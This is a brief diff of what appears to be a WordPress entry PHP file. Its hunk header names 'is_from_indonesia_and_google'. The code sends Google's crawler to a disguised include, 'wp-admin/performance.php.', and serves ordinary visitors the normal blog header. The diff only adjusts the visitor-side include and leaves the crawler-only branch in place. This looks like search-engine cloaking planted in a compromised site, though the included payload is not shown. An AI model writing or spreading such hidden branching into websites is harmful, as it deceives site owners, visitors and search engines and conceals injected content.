@@ -24,7 +24,7 @@ function is_from_indonesia_and_google() {
 if (is_google_bot()) {
 include __DIR__ . '/wp-admin/performance.php.';
 } else {
-    include('wp-blog-header2.php');
+    include('wp-blog-header.php');
     exit;
 }
 ?>
